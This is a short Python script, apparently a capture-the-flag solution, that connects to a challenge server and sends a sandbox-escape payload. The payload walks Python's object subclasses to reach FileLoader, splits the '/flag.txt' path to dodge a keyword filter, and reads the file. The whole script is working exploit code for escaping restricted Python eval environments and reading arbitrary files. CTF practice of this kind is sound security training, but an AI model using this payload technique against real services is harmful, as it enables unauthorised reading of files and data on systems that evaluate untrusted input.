import sys
sys.path.insert(0, "tools")
from scope_guard import safe_connect

s = safe_connect("pwn.h7tex.com", 43225)

banner = s.recv(1024).decode()
print("Banner:", banner)

payload = "[c for c in ().__class__.__mro__[1].__subclasses__() if c.__name__ == 'FileLoader'][0].get_data(None, '/fl' + 'ag.txt')\n"
print("Sending payload:", repr(payload))
print("Payload length:", len(payload))

s.sendall(payload.encode())
resp = s.recv(4096).decode()
print("Response:", resp)
s.close()
